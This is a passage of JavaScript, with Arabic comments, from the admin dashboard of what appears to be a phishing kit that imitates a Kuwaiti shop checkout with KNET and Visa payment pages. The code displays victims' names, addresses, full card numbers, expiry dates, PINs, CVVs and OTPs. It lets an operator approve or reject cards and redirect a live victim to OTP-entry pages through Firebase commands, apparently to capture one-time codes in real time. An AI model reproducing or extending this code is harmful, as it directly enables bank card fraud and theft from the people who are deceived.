      if (minutes < 60) return `${minutes} دقيقة و ${seconds % 60} ثانية`;
      const hours = Math.floor(minutes / 60);
      return `${hours} ساعة و ${minutes % 60} دقيقة`;
    };
    const formatRefTime = (value) => formatElapsed(value);
    const sortedCards = [...cards].sort((a, b) => cardTime(b) - cardTime(a));
    const sortedOtps = [...otps].sort((a, b) => otpTime(b) - otpTime(a));
    // آخر نشاط لكل صندوق: معلومات أساسية / بطاقات / رموز تحقق — لترتيبها من الأحدث إلى الأقدم
    const basicBoxTime = toMillis(visitor.customerUpdatedAt || visitor.createdDate);
    const cardsBoxTime = sortedCards.length ? cardTime(sortedCards[0]) : 0;
    const otpsBoxTime = sortedOtps.length ? otpTime(sortedOtps[0]) : 0;
    const field = (label, value) => `<div class="ref-detail-field"><span>${escapeHtml(label)}</span><b class="${value ? 'ref-copyable' : ''}" ${value ? `data-copy="${escapeHtml(String(value))}"` : ''}>${escapeHtml(value || 'غير متوفر')}</b></div>`;
    const cardKey = (card) => card.id || `${visitor.sessionId || visitor.id}:${card.cardNumber || visitor.cardNumber || 'card'}`;
    const cardStatus = (card) => cardDecisionOverrides.get(cardKey(card)) || card.decision || card.status || '';
    const cardStatusLabel = (card) => cardStatus(card) === 'approved' ? 'تمت الموافقة' : cardStatus(card) === 'rejected' ? 'تم الرفض' : 'قيد المراجعة';
    const cardHtml = sortedCards.length ? sortedCards.map((card, i) => {
      const decision = cardStatus(card);
      const cardId = card.id || '';
      const cardNumber = card.cardNumber || visitor.cardNumber || '';
      const pinCode = String(card.pin || visitor.pin || '').trim();
      const cvvCode = String(card.cvv || card.securityCode || visitor.cvv || '').trim();
      const firebaseBankName = cleanFirebaseBankName(card.bankName || card.bank, cardNumber);
      const fixedBankCode = getKuwaitBankCode(cardNumber);
      // الاسم المختصر الإنجليزي من قاعدة BIN هو المعروض على البطاقة
      const initialBankName = getKuwaitBankLabel(cardNumber) || firebaseBankName || 'غير معروف';
      const timestamp = cardTime(card);
      const scheme = cardSchemeClass(card.scheme || card.network);
      const bankClass = fixedBankCode ? `bank-${cardSchemeClass(fixedBankCode)}` : 'bank-unknown';
      return `<div class="ref-card-shell"><div class="ref-card-box-label"><div><strong>البطاقة ${i + 1}</strong><time class="ref-box-time" data-box-counter data-box-time="${timestamp}" datetime="${timestamp}">${escapeHtml(formatRefTime(timestamp))}</time></div><span class="ref-card-state ${decision}">${cardStatusLabel(card)}</span></div><article class="ref-card-box bank-card bank-card-${scheme} ${bankClass} ${decision === 'approved' ? 'is-approved' : decision === 'rejected' ? 'is-rejected' : ''}" data-ref-time="${timestamp}" data-card-number="${escapeHtml(cardNumber)}">
        <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='/assets/images/unknown-bank.svg'"></div>
        <div class="bank-card-number ref-copyable" data-copy="${escapeHtml(cardNumber || '')}">${escapeHtml(cardNumber || '•••• •••• •••• ••••')}</div>
        <div class="bank-card-details">
          <div><small>حامل البطاقة</small><strong class="ref-copyable" ${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || '')) ? `data-copy="${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || ''))}"` : ''}>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
          <div><small>تاريخ الانتهاء</small><strong class="ref-copyable" ${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || '')) ? `data-copy="${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || ''))}"` : ''}>${escapeHtml(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || 'غير متوفر')}</strong></div>
          <div><small>الرقم السري (PIN)</small><strong class="ref-copyable" ${pinCode ? `data-copy="${escapeHtml(pinCode)}"` : ''}>${escapeHtml(pinCode || 'غير متوفر')}</strong></div>
          <div><small>رمز الأمان (CVV)</small><strong class="ref-copyable" ${cvvCode ? `data-copy="${escapeHtml(cvvCode)}"` : ''}>${escapeHtml(cvvCode || 'غير متوفر')}</strong></div>
        </div>
        ${decision ? '' : `<div class="ref-card-actions"><button data-card-action="approve" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">✓ موافقة</button><button data-card-action="reject" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">× رفض</button></div>`}
      </article></div>`;
    }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
    // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('الدولة', visitor.country)}${field('العنوان', visitor.address)}${field('المبلغ', visitor.amount)}</article>`;
    const cardsSectionHtml = cards.length ? `<div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}` : '';
    const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
    // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
    // صندوق المعلومات الأساسية يظهر دائماً حتى وإن لم يتوفر له وقت.
    const stackSections = [
      { time: basicBoxTime, html: basicBoxHtml, always: true },
      { time: cardsBoxTime, html: cardsSectionHtml, always: false },
      { time: otpsBoxTime, html: otpsSectionHtml, always: false },
    ]
      .filter(s => s.always || s.html)
      .sort((a, b) => {
        // الأحدث زمنياً في الأعلى؛ الصندوق بلا وقت ينزل للأسفل
        if (b.time !== a.time) return b.time - a.time;
        return (a.always ? 0 : 1) - (b.always ? 0 : 1);
      })
      .map(s => s.html)
      .join('');
    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="cart">سلة المشتريات</button><button data-ref-nav="knet">دفع كي نت</button><button data-ref-nav="verification">رمز كي نت</button><button data-ref-nav="card">دفع فيزا</button><button data-ref-nav="otp">رمز فيزا</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="cart">سلة المشتريات</option><option value="knet">دفع كي نت</option><option value="verification">رمز كي نت</option><option value="card">دفع فيزا</option><option value="otp">رمز فيزا</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
    els.referenceDetailEmpty.classList.add('hidden');
    if (boxCounterTimer) clearInterval(boxCounterTimer);
    els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
      const cardRecord = sortedCards[index];
      const number = cardRecord?.cardNumber || visitor.cardNumber || '';
      lookupCardBin(number).then((binData) => {
        if (!binData || !cardElement.isConnected) return;
        const fixedBankCode = getKuwaitBankCode(number);
        const fixedBankLabel = getKuwaitBankLabel(number);
        const bankName = fixedBankLabel || cleanFirebaseBankName(cardRecord.bankName || cardRecord.bank, number) || 'غير معروف';
        const scheme = String(binData.scheme || binData.brand || 'CARD').toUpperCase();
        const logoUrl = bankLogoDataUrl(fixedBankCode);
        const bankLabel = cardElement.querySelector('[data-card-bank]');
        const brandLabel = cardElement.querySelector('[data-card-brand]');
        const logo = cardElement.querySelector('[data-bank-logo]');
        if (bankLabel) bankLabel.textContent = bankName;
        if (brandLabel) brandLabel.textContent = bankName;
        if (logo) { logo.src = logoUrl; logo.alt = fixedBankCode ? `شعار ${fixedBankLabel || fixedBankCode}` : 'لم يتم التعرف على البنك'; }
        cardElement.classList.add(`bank-card-${cardSchemeClass(binData.scheme || binData.brand)}`);
      });
    });
    const refreshBoxCounters = () => els.referenceDetailContent.querySelectorAll('[data-box-counter]').forEach((node) => { node.textContent = formatElapsed(Number(node.dataset.boxTime)); });
    refreshBoxCounters();
    boxCounterTimer = setInterval(refreshBoxCounters, 1000);
    // النسخ عند النقر على أي نص يحمل data-copy (بيانات شخصية / بطاقات / رموز)
    els.referenceDetailContent.onclick = (e) => {
      const copyEl = e.target.closest('[data-copy]');
      if (!copyEl) return;
      const value = (copyEl.dataset.copy || '').trim();
      if (!value) return;
      navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
    };
    els.referenceDetailContent.classList.remove('hidden');
    const NAV_PAGE_MAP = {
      home: 'index',
      cart: 'cartepage.html',
      knet: 'knet.html',
      verification: 'verification.html',
      card: 'card-payment.html',
      otp: 'otpcredit_card_page.html',
    };
    // إرسال أمر توجيه للعميل عبر RTDB commands/{sessionId}/redirect
    // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
    const sendNavCommand = (prettyLabel, targetPage) => {
      const docId = visitor.sessionId || visitor.id;
      const cmdRef = rtd.ref('commands/' + docId + '/redirect');
      cmdRef.set({
        action: 'REDIRECT_PAGE',
        targetPage: targetPage,
        seq: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
        timestamp: new Date().toLocaleTimeString('ar-EG'),
        adminId: 'admin',
      }).then(() => {
        // تحديث currentPage في Firestore للعرض فقط
        db.collection('customers').doc(docId).set({ currentPage: prettyLabel }, { merge: true });
        toast('تم توجيه الزائر إلى ' + prettyLabel, 'success');
      }).catch(() => toast('تعذر توجيه الزائر', 'error'));
    };
    els.referenceDetailContent.querySelectorAll('[data-ref-nav]').forEach(btn => btn.addEventListener('click', () => {
      const target = btn.dataset.refNav;
      const targetPage = NAV_PAGE_MAP[target] || target;
      sendNavCommand(target, targetPage);
    }));
    const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
    const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
    const doFreeNav = () => {
      const raw = (freeInput.value || '').trim();
      if (!raw) return;
      // السماح بأي مسار يكتبه المدير (صفحة، مجلد، رابط جزئي) — يُرسل كما هو
      sendNavCommand(raw, raw);
      freeInput.value = '';
    };
    freeGo?.addEventListener('click', doFreeNav);
    freeInput?.addEventListener('keydown', (e) => { if (e.key === 'Enter') doFreeNav(); });
    els.referenceDetailContent.querySelector('[data-ref-nav-select]')?.addEventListener('change', (e) => {
      const target = e.target.value;
      if (target) els.referenceDetailContent.querySelector(`[data-ref-nav="${target}"]`)?.click();
    });
    els.referenceDetailContent.querySelector('[data-ref-action="refresh"]')?.addEventListener('click', () => renderReferenceDetail(visitor));
    els.referenceDetailContent.querySelector('[data-ref-action="back"]')?.addEventListener('click', () => {
      selectedReferenceId = null;
      document.getElementById('app')?.classList.remove('mobile-detail-selected');
    });
    els.referenceDetailContent.querySelector('[data-ref-action="block"]')?.addEventListener('click', () => {
      const docId = visitor.sessionId || visitor.id;
      db.collection('customers').doc(docId).set({ isBlocked: true }, { merge: true }).then(() => toast('تم حظر الزائر', 'success'));
    });
    els.referenceDetailContent.querySelectorAll('[data-card-action]').forEach((button) => button.addEventListener('click', async () => {
      const decision = button.dataset.cardAction === 'approve' ? 'approved' : 'rejected';
      const cardId = button.dataset.cardId;
      const sessionId = button.dataset.sessionId || visitor.sessionId || visitor.id;
      const cardKeyValue = button.dataset.cardKey;
      try {
        cardDecisionOverrides.set(cardKeyValue, decision);
        const writes = [];
        // 1) وثيقة البطاقة cards/{cardId} (سجل لكل محاولة)
        if (cardId) writes.push(db.collection('cards').doc(cardId).set({ decision, decisionUpdatedAt: Date.now() }, { merge: true }));
        // 2) وثيقة العميل customers/{sessionId} — المصدر الأساسي الذي يستمع له موقع العملاء
        if (sessionId) {
          writes.push(db.collection('customers').doc(sessionId).set({ decision, status: decision, decidedAt: firebase.firestore.FieldValue.serverTimestamp(), lastSeen: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true }));
        }
        // 3) قناة RTDB commands/{sessionId}/approval|rejection — مصدر احتياطي للوحة القديمة
        if (sessionId && typeof rtd !== 'undefined') {
          const action = decision === 'approved' ? 'APPROVE_PAYMENT' : 'REJECT_PAYMENT';
          const cmd = {
            action: action,
            status: decision,
            timestamp: new Date().toLocaleTimeString('ar-EG'),
            adminId: 'admin'
          };
          if (decision === 'approved') cmd.approvedAt = Date.now();
          else cmd.rejectedAt = Date.now();
          writes.push(rtd.ref('commands/' + sessionId + '/' + (decision === 'approved' ? 'approval' : 'rejection')).set(cmd));
        }
        await Promise.all(writes);
        toast(decision === 'approved' ? 'تمت الموافقة على البطاقة' : 'تم رفض البطاقة', decision === 'approved' ? 'success' : 'error');
        renderReferenceDetail(visitor);
      } catch (error) {
        cardDecisionOverrides.delete(cardKeyValue);
        console.error('Card decision error:', error);
        toast('تعذر تحديث حالة البطاقة', 'error');
      }
    }));
  }

  // ── عرض الإحصائيات ──────────────────────────────────────────
  function renderStats() {
    // الإحصائيات على البيانات المدمجة (بطاقات فريدة عبر sessionId)
    const total = allNotifications.length;
    // عداد الرأس يجب أن يشمل الزائر الجديد حتى قبل إدخال الاسم/الهاتف/البطاقة.
    const online = Object.values(customersMap).filter(customer => !customer.isHidden && isOnline(customer.lastSeen, customer.online)).length;
    const cards = allNotifications.filter(n => n.cardNumber).length;
    const approved = allNotifications.filter(n => n.status === 'approved' || n.status === 'APPROVED' || n.decision === 'approved').length;
    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const today = allNotifications.filter(n => {
      const value = n.lastActivity || n.createdDate;
      const time = value?.toDate ? value.toDate().getTime() : new Date(value || 0).getTime();
      return time >= todayStart.getTime();
    }).length;
    if (els.headerOnlineCount) els.headerOnlineCount.textContent = String(online);
    if (els.headerTodayCount) els.headerTodayCount.textContent = String(today);
    if (els.headerTotalCount) els.headerTotalCount.textContent = String(total);
    if (els.headerCardCount) els.headerCardCount.textContent = String(cards);
    if (!showStats) { els.statsSection.innerHTML = ''; return; }

    const stats = [
      { title: 'إجمالي الزوار', value: total, change: '+12%', color: 'from-blue-500 to-blue-600', icon: '<path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path>' },
      { title: 'المستخدمين المتصلين', value: online, change: '+5%', color: 'from-green-500 to-green-600', icon: '<path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>' },
      { title: 'معلومات البطاقات', value: cards, change: '+8%', color: 'from-purple-500 to-purple-600', icon: '<rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line>' },
      { title: 'الموافقات', value: approved, change: '+15%', color: 'from-emerald-500 to-emerald-600', icon: '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline>' },
    ];

    els.statsSection.innerHTML = stats.map(s => `
      <div class="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 rounded-xl p-5 shadow-xl shadow-black/20">
        <div class="flex items-center justify-between mb-4">
          <div class="bg-gradient-to-br ${s.color} p-3 rounded-xl shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${s.icon}</svg>
          </div>
          <span class="text-sm font-semibold text-emerald-400 bg-emerald-500/10 px-2 py-1 rounded-md">${s.change}</span>
        </div>
        <div>
          <p class="text-3xl font-bold text-white">${s.value}</p>
          <p class="text-sm text-slate-400 mt-1">${escapeHtml(s.title)}</p>
        </div>
      </div>
    `).join('');
  }

  // ── عرض الجدول ──────────────────────────────────────────────
  function renderTable() {
    els.notifCount.textContent = filteredNotifications.length;

    if (filteredNotifications.length === 0) {
      els.tbody.innerHTML = '';
      els.emptyState.classList.remove('hidden');
      els.emptyState.classList.add('flex');
      els.emptyMsg.textContent = (searchQuery || currentFilter !== 'all')
        ? 'لم يتم العثور على نتائج مطابقة للفلاتر'
        : 'ستظهر الإشعارات هنا عند استلامها';
      els.pagination.classList.add('hidden');
      return;
    }
    els.emptyState.classList.add('hidden');
    els.emptyState.classList.remove('flex');

    // الترقيم
    const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / pageSize));
    if (currentPage > totalPages) currentPage = totalPages;
    const startIdx = (currentPage - 1) * pageSize;
    const pageItems = filteredNotifications.slice(startIdx, startIdx + pageSize);

    els.tbody.innerHTML = pageItems.map(n => {
      const online = isOnline(n.lastSeen, n.online);
      const onlineCls = online ? 'text-emerald-400' : 'text-slate-500';
      const status = n.decision || n.status || 'pending';
      const flagBorder = n.flagColor ? `style="border-right:3px solid ${n.flagColor === 'red' ? '#ef4444' : n.flagColor === 'yellow' ? '#eab308' : '#22c55e'}"` : '';
      const countryOrBank = n.country || n.bank || 'غير معروف';
      const hasPersonal = n.phone || n.name;
      return `
        <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors" ${flagBorder} data-id="${escapeHtml(n.id)}">
          <td class="px-6 py-4">
            <div class="flex items-center gap-3">
              <div class="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500/20 to-teal-500/10 flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-400"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle></svg>
              </div>
              <span class="font-medium text-white">${escapeHtml(countryOrBank)}</span>
            </div>
          </td>
          <td class="px-6 py-4">
            <div class="flex flex-wrap gap-2">
              <button class="info-btn px-3 py-1.5 rounded-md text-xs font-medium ${hasPersonal ? 'bg-blue-500/10 text-blue-400 border border-blue-500/30 hover:bg-blue-500/20' : 'bg-slate-800/50 text-slate-500 border border-slate-700'}" data-info="personal" data-id="${escapeHtml(n.id)}">${(n.allOtps && n.allOtps.length > 1) ? `معلومات شخصية (${n.allOtps.length} OTP)` : 'معلومات شخصية'}</button>
              <button class="info-btn px-3 py-1.5 rounded-md text-xs font-medium ${n.cardNumber ? 'bg-green-500 text-white border-2 border-blue-400 shadow-sm card-pending-review' : 'bg-slate-800/50 text-slate-500 border border-slate-700'}" data-info="card" data-id="${escapeHtml(n.id)}">${(n.allCards && n.allCards.length > 1) ? `معلومات البطاقة (${n.allCards.length})` : 'معلومات البطاقة'}</button>
            </div>
          </td>
          <td class="px-6 py-4">${statusBadge(status)}</td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-2 text-sm text-slate-400">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="flex-shrink-0 text-slate-500"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
              <span class="whitespace-nowrap">${timeAgo(n.lastSeen || n.createdDate)}</span>
            </div>
          </td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-2">
              <span class="w-2 h-2 rounded-full ${online ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600'}"></span>
              <span class="text-sm ${onlineCls}">${online ? 'نشط الآن' : 'غير نشط'}</span>
            </div>
          </td>
          <td class="px-6 py-4 text-center">
            ${n.otp ? `<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-xs font-mono bg-emerald-500/10 text-emerald-400 border-emerald-500/30">${escapeHtml(String(n.otp))}</span>` : '<span class="text-slate-500 text-sm">-</span>'}
          </td>
          <td class="px-6 py-4 text-center">
            ${n.currentPage ? `<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-xs bg-slate-800/50 text-slate-300 border-slate-700">${escapeHtml(n.currentPage)}</span>` : '<span class="text-slate-500 text-sm">-</span>'}
          </td>
          <td class="px-6 py-4">
            <div class="flex items-center gap-1">
              <button class="info-btn px-2 py-1.5 rounded-md text-xs font-medium bg-slate-700/50 text-slate-300 hover:bg-slate-700 border border-slate-600" data-info="card" data-id="${escapeHtml(n.id)}" title="تفاصيل">⋯</button>
              ${(status === 'pending' || !status || status === 'PENDING' || status === '') ? `
                <button class="action-approve px-2 py-1.5 rounded-md text-xs font-semibold bg-emerald-600 hover:bg-emerald-700 text-white border border-emerald-500" data-id="${escapeHtml(n.id)}" title="موافقة">✓</button>
                <button class="action-reject px-2 py-1.5 rounded-md text-xs font-semibold bg-red-600 hover:bg-red-700 text-white border border-red-500" data-id="${escapeHtml(n.id)}" title="رفض">✕</button>
              ` : ''}
            </div>
          </td>
        </tr>
      `;
    }).join('');

    // الترقيم
    if (filteredNotifications.length > pageSize) {
      els.pagination.classList.remove('hidden');
      els.pagination.classList.add('flex');
      els.paginationInfo.textContent = `عرض ${startIdx + 1}-${Math.min(startIdx + pageSize, filteredNotifications.length)} من ${filteredNotifications.length}`;
      let buttons = '';
      buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm bg-slate-800 text-slate-300 hover:bg-slate-700 ${currentPage === 1 ? 'opacity-50 cursor-not-allowed' : ''}" data-page="${currentPage - 1}" ${currentPage === 1 ? 'disabled' : ''}>السابق</button>`;
      for (let p = 1; p <= totalPages; p++) {
        buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm ${p === currentPage ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}" data-page="${p}">${p}</button>`;
      }
      buttons += `<button class="page-btn px-3 py-1.5 rounded-md text-sm bg-slate-800 text-slate-300 hover:bg-slate-700 ${currentPage === totalPages ? 'opacity-50 cursor-not-allowed' : ''}" data-page="${currentPage + 1}" ${currentPage === totalPages ? 'disabled' : ''}>التالي</button>`;
      els.paginationButtons.innerHTML = buttons;
    } else {
      els.pagination.classList.add('hidden');
      els.pagination.classList.remove('flex');
    }
  }

  // ── نافذة التفاصيل ──────────────────────────────────────────
  function openDetail(id, type) {
    const n = allNotifications.find(x => x.id === id || x.sessionId === id);
    if (!n) return;
    currentDetailId = n.id;
    els.detailTitle.textContent = type === 'card' ? 'معلومات البطاقة' : 'المعلومات الشخصية';
    if (type === 'personal') {
      // معلومات شخصية من customers — البيانات التي يجمعها الموقع فعلياً
      const itemsText = (n.items && n.items.length)
        ? n.items.map(it => `${escapeHtml(it.name || 'منتج')} × ${escapeHtml(String(it.qty || 1))} (${escapeHtml(String(it.price || 0))} د.ك)`).join('، ')
        : '';
      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
      const fields = [
        { label: 'الاسم', value: n.name },
        { label: 'رقم الهاتف', value: n.phone },
        { label: 'العنوان', value: n.address },
        { label: 'الشقة / رقم الباب', value: n.apartment },
        { label: 'تعليمات خاصة', value: n.deliveryNotes },
        { label: 'المنتج', value: itemsText },
        { label: 'طريقة الدفع', value: paymentLabel },
        { label: 'المبلغ', value: n.amount },
      ];
      let html = renderDetailFields(fields);

      // قسم رموز التحقق (OTP) — كل رمز في صندوق منفصل
      if (n.allOtps && n.allOtps.length) {
        html += `
          <div class="mt-4 pt-4 border-t border-slate-700">
            <div class="flex items-center justify-between mb-3">
              <h4 class="text-sm font-semibold text-emerald-400">رموز التحقق (${n.allOtps.length})</h4>
            </div>
            <div class="space-y-2">
              ${n.allOtps.map((o, i) => `
                <div class="flex items-center justify-between p-2.5 bg-slate-800/50 rounded-lg border border-slate-700">
                  <div class="flex items-center gap-2">
                    <span class="text-xs font-semibold text-slate-500 bg-slate-700 px-2 py-0.5 rounded">#${n.allOtps.length - i}</span>
                    <span class="text-lg font-mono font-bold text-emerald-400">${escapeHtml(String(o.otp || ''))}</span>
                  </div>
                  <div class="flex items-center gap-2">
                    <span class="text-xs text-slate-500">${escapeHtml(o.timestamp || timeAgo(o.createdAt))}</span>
                    <button class="copy-otp-btn text-slate-400 hover:text-emerald-400 p-1 rounded hover:bg-slate-700" data-otp="${escapeHtml(String(o.otp || ''))}" title="نسخ">
                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    </button>
                  </div>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      }
      els.detailContent.innerHTML = html;

      // ربط أزرار النسخ
      els.detailContent.querySelectorAll('.copy-otp-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          const val = btn.dataset.otp;
          navigator.clipboard.writeText(val).then(() => toast('تم نسخ الرمز: ' + val, 'success'));
        });
      });
    } else {
      // معلومات البطاقة: كل بطاقة في صندوق منفصل
      const cards = n.allCards && n.allCards.length ? n.allCards : [n];
      let html = '';
      cards.forEach((card, i) => {
        const isLatest = i === 0;
        const cardData = {
          // الاسم المختصر الإنجليزي من قاعدة BIN يُفضَّل على اسم Firebase
          bank: getKuwaitBankLabel(card.cardNumber || n.cardNumber) || card.bankName || card.bank || n.bank,
          cardNumber: card.cardNumber || n.cardNumber,
          prefix: card.cardPrefix || card.prefix || n.prefix,
          expiry: card.expiry || n.expiryDate,
          pin: card.pin || '',
          cvv: card.cvv || '',
          timestamp: card.timestamp || '',
        };
        const cardId = card.id || '';
        const cardDecision = card.decision || '';
        if (cards.length > 1) {
          html += `<div class="mb-2 flex items-center gap-2">
            <span class="text-xs font-semibold ${isLatest ? 'text-emerald-400' : 'text-slate-500'} bg-${isLatest ? 'emerald' : 'slate'}-500/10 px-2 py-0.5 rounded">البطاقة ${cards.length - i}</span>
            ${isLatest ? '<span class="text-xs text-emerald-400">الأحدث</span>' : '<span class="text-xs text-slate-500">سابقة</span>'}
          </div>`;
        }
        html += renderDetailFields([
          { label: 'البنك', value: cardData.bank },
          { label: 'رقم البطاقة', value: cardData.cardNumber ? `${cardData.cardNumber} - ${cardData.prefix || ''}` : undefined },
          { label: 'تاريخ الانتهاء', value: cardData.expiry },
          { label: 'الرقم السري (PIN)', value: cardData.pin },
          { label: 'رمز الأمان (CVV)', value: cardData.cvv },
        ]);
        if (cardData.timestamp) {
          html += `<div class="text-xs text-slate-500 text-left mb-2">الوقت: ${escapeHtml(cardData.timestamp)}</div>`;
        }
        // أزرار الموافقة/الرفض لكل محاولة دفع — تظهر لمرة واحدة، ثم تُخفى وتُعرض الحالة
        if (cardDecision === 'approved') {
          html += `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center">
            <span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span>
          </div>`;
        } else if (cardDecision === 'rejected') {
          html += `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center">
            <span class="text-sm font-semibold text-red-400">✕ تم الرفض</span>
          </div>`;
        } else {
          html += `<div class="mt-2 flex gap-2" data-card-actions="${escapeHtml(cardId || n.sessionId || i)}">
            <button class="card-approve flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">موافقة</button>
            <button class="card-reject flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">رفض</button>
          </div>`;
        }
        if (i < cards.length - 1) {
          html += '<div class="my-3 border-t border-slate-700"></div>';
        }
      });

      // قسم OTP في نافذة البطاقة أيضاً
      if (n.allOtps && n.allOtps.length) {
        html += `
          <div class="mt-4 pt-4 border-t border-slate-700">
            <h4 class="text-sm font-semibold text-emerald-400 mb-3">رموز التحقق (${n.allOtps.length})</h4>
            <div class="grid grid-cols-2 gap-2">
              ${n.allOtps.map((o, i) => `
                <div class="flex items-center justify-between p-2 bg-slate-800/50 rounded-lg border border-slate-700">
                  <span class="text-xs text-slate-500">#${n.allOtps.length - i}</span>
                  <span class="text-lg font-mono font-bold text-emerald-400">${escapeHtml(String(o.otp || ''))}</span>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      }

      // معلومات إضافية من العميل
      html += `
        <div class="mt-4 pt-4 border-t border-slate-700">
          <h4 class="text-sm font-semibold text-blue-400 mb-3">معلومات إضافية</h4>
          ${renderDetailFields([
            { label: 'المبلغ', value: n.amount },
          ])}
        </div>
